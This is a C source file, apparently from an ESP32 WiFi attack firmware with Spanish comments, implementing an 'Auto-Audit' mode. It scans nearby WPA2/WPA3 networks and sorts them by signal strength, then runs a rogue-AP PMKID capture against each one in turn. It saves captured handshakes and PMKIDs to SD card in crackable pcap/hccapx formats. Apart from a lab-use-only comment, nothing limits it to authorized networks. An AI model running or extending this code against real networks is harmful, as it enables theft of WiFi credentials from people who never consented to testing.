/*
 * ChL-CyberKit v1.0 PRO — ESP32 WiFi/BLE Security Auditing Framework
 * Copyright (C) 2026  ChL (Pedro Reza) <pedrorezabala26@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
/**
 * @file auto_audit.c
 * @brief Implementación del modo Auto-Audit.
 *        SOLO PARA USO EN LABORATORIO AUTORIZADO.
 *
 * @author Pedro Luis Rezabala — ChL-CyberKit v1.0 PRO
 */
#include "auto_audit.h"
#include "beacon_parser.h"
#include "wifi_controller.h"
#include "ap_scanner.h"
#include "attack.h"
#include "webserver.h"
#include "sd_storage.h"
#include "pcap_serializer.h"
#include "hccapx_serializer.h"

#include <string.h>
#include <stdio.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "auto_audit";

/* ── Estado interno ─────────────────────────────────────────────────────── */
static auto_audit_status_t g_status;
static volatile bool       g_running = false;
static TaskHandle_t        g_task    = NULL;

/* ── Estructura de target priorizado ─────────────────────────────────────── */
typedef struct {
    uint8_t  bssid[6];
    char     ssid[33];
    uint8_t  channel;
    int8_t   rssi;
    uint8_t  ap_idx;      /* índice en ap_records del wifi_controller */
} aa_target_t;

#define AA_MAX_TARGETS 32

static aa_target_t g_targets[AA_MAX_TARGETS];
static uint8_t     g_target_count = 0;

/* ── Comparador de prioridad (mayor RSSI primero) ───────────────────────── */
static int cmp_targets(const void *a, const void *b) {
    const aa_target_t *ta = (const aa_target_t *)a;
    const aa_target_t *tb = (const aa_target_t *)b;
    /* Orden descendente por RSSI */
    return (int)tb->rssi - (int)ta->rssi;
}

/* ── Construir lista de targets priorizados ─────────────────────────────── */
static void build_target_list(void) {
    g_target_count = 0;
    const wifictl_ap_records_t *recs = wifictl_get_ap_records();
    if (!recs || recs->count == 0) return;

    for (uint8_t i = 0; i < recs->count && g_target_count < AA_MAX_TARGETS; i++) {
        const wifi_ap_record_t *ap = &recs->records[i];

        /* Filtro: RSSI mínimo */
        if (ap->rssi < -85) continue;

        /* Filtro: skip si WPA3 con PMF required (usando beacon_parser) */
        const bp_ap_info_t *bpap = beacon_parser_find_ap(ap->bssid);
        if (bpap && bpap->pmf_required) {
            g_status.skipped_pmf++;
            ESP_LOGI(TAG, "Skip PMF required: %s", (char *)ap->ssid);
            continue;
        }

        /* Solo WPA2/WPA3 (saltar redes abiertas — no hay captura útil) */
        if (ap->authmode == WIFI_AUTH_OPEN || ap->authmode == WIFI_AUTH_WEP) continue;

        aa_target_t *t = &g_targets[g_target_count++];
        memcpy(t->bssid, ap->bssid, 6);
        memcpy(t->ssid, ap->ssid, 32);
        t->ssid[32] = '\0';
        t->channel  = ap->primary;
        t->rssi     = ap->rssi;
        t->ap_idx   = i;
    }

    /* Ordenar por RSSI */
    if (g_target_count > 1) {
        /* Insertion sort (sin qsort para evitar dependencia de stdlib en algunos
         * builds estrictos; además, el array es pequeño) */
        for (uint8_t i = 1; i < g_target_count; i++) {
            aa_target_t tmp = g_targets[i];
            int j = (int)i - 1;
            while (j >= 0 && (int)g_targets[j].rssi < (int)tmp.rssi) {
                g_targets[j + 1] = g_targets[j];
                j--;
            }
            g_targets[j + 1] = tmp;
        }
    }

    (void)cmp_targets; /* suprimir advertencia de función no usada */
    ESP_LOGI(TAG, "%d targets candidatos (skipped_pmf=%d)",
             (int)g_target_count, (int)g_status.skipped_pmf);
}

/* ── Guardar captura del target actual ───────────────────────────────────── */
static void save_current_capture(uint8_t type, const aa_target_t *t) {
    if (type == 1) {  /* Handshake */
        uint8_t  *pcap_buf = pcap_serializer_get_buffer();
        unsigned  pcap_len = pcap_serializer_get_size();
        hccapx_t *hx       = hccapx_serializer_get();
        if (pcap_len > 0) {
            sd_result_t res = sd_save_handshake(t->ssid, pcap_buf, pcap_len,
                                                 (uint8_t *)hx, sizeof(hccapx_t));
            if (res == SD_OK) g_status.captures++;
            ESP_LOGI(TAG, "[AUTO] HS guardado: %s (%s)",
                     t->ssid, res == SD_OK ? "OK" : "ERROR");
        }
    } else if (type == 2) {  /* PMKID */
        const attack_status_t *st = attack_get_status();
        if (st && st->content && st->content_size > 13) {
            uint8_t ssid_len = (uint8_t)st->content[12];
            char ssid_safe[33] = {0};
            if (ssid_len > 0 && ssid_len <= 32) memcpy(ssid_safe, st->content + 13, ssid_len);
            sd_result_t res = sd_save_pmkid(ssid_safe[0] ? ssid_safe : t->ssid,
                                             (const uint8_t *)st->content,
                                             st->content_size);
            if (res == SD_OK) g_status.captures++;
            ESP_LOGI(TAG, "[AUTO] PMKID guardado: %s (%s)",
                     t->ssid, res == SD_OK ? "OK" : "ERROR");
        }
    }
}

/* ── Tarea principal del auto-audit ─────────────────────────────────────── */
static void auto_audit_task(void *arg) {
    (void)arg;

    /* ── FASE 1: Escaneo ──────────────────────────────────────────────── */
    g_status.state = AA_SCANNING;
    ESP_LOGI(TAG, "[AUTO] Escaneando…");

    /* Activar modo promiscuo brevemente para beacon_parser */
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    wifictl_scan_nearby_aps();
    vTaskDelay(pdMS_TO_TICKS(5000));  /* 5s de escucha pasiva de beacons */

    build_target_list();
    g_status.targets_total = g_target_count;

    if (g_target_count == 0) {
        ESP_LOGW(TAG, "[AUTO] Sin targets válidos. Terminando.");
        g_status.state = AA_DONE;
        g_running = false;
        vTaskDelete(NULL);
        return;
    }

    /* ── FASE 2: Iterar targets ───────────────────────────────────────── */
    for (uint8_t i = 0; i < g_target_count && g_running; i++) {
        aa_target_t *t = &g_targets[i];

        strncpy(g_status.current_ssid, t->ssid, 32);
        g_status.current_ssid[32] = '\0';
        g_status.current_rssi = t->rssi;
        g_status.state = AA_ATTACKING;

        ESP_LOGI(TAG, "[AUTO] Atacando [%d/%d]: '%s' ch=%d RSSI=%d",
                 (int)(i + 1), (int)g_target_count,
                 t->ssid, (int)t->channel, (int)t->rssi);

        /* Intentar PMKID primero (más rápido, sin cliente) */
        attack_request_t req;
        memset(&req, 0, sizeof(req));
        req.ap_record_id = t->ap_idx;
        req.type         = 2;  /* PMKID */
        req.method       = 1;  /* RogueAP */
        req.timeout      = AUTO_AUDIT_TIMEOUT_S;

        esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_REQUEST,
                       &req, sizeof(req), portMAX_DELAY);

        /* Esperar a que termine (timeout + 5s extra) */
        uint32_t deadline = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS)
                            + (AUTO_AUDIT_TIMEOUT_S + 5) * 1000;
        while (g_running) {
            const attack_status_t *st = attack_get_status();
            if (!st || st->state != 1) break;  /* state=1 → running */
            uint32_t now_ms = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
            if (now_ms > deadline) {
                esp_event_post(WEBSERVER_EVENTS, WEBSERVER_EVENT_ATTACK_RESET,
                               NULL, 0, portMAX_DELAY);
                break;
            }
            vTaskDelay(pdMS_TO_TICKS(500));
        }

        /* Guardar lo capturado */
        g_status.state = AA_SAVING;
        const attack_status_t *st = attack_get_status();
        if (st && st->state == 2) {  /* state=2 → finished */
            save_current_capture((uint8_t)st->type, t);
        }

        g_status.targets_done++;
        vTaskDelay(pdMS_TO_TICKS(2000));  /* Pausa entre targets */
    }

    g_status.state = AA_DONE;
    g_running = false;
    ESP_LOGI(TAG, "[AUTO] Completado. %d/%d capturas.",
             (int)g_status.captures, (int)g_status.targets_total);
    vTaskDelete(NULL);
}

/* ── API ─────────────────────────────────────────────────────────────────── */
void auto_audit_init(void) {
    memset(&g_status, 0, sizeof(g_status));
    g_status.state = AA_IDLE;
    g_running = false;
    g_task    = NULL;
    ESP_LOGI(TAG, "Auto-Audit inicializado");
}

bool auto_audit_start(void) {
    if (g_running) {
        ESP_LOGW(TAG, "Auto-Audit ya en curso");
        return false;
    }
    memset(&g_status, 0, sizeof(g_status));
    g_status.state = AA_IDLE;
    g_running = true;

    BaseType_t r = xTaskCreate(auto_audit_task, "aa_task", 6144, NULL, 4, &g_task);
    if (r != pdPASS) {
        g_running = false;
        ESP_LOGE(TAG, "No se pudo crear tarea auto_audit");
        return false;
    }
    return true;
}

void auto_audit_stop(void) {
    if (!g_running) return;
    g_running = false;
    /* La tarea detecta g_running=false y sale */
    g_task = NULL;
    g_status.state = AA_IDLE;
    ESP_LOGI(TAG, "Auto-Audit detenido por usuario");
}

auto_audit_status_t auto_audit_get_status(void) {
    return g_status;
}

bool auto_audit_is_running(void) {
    return g_running;
}
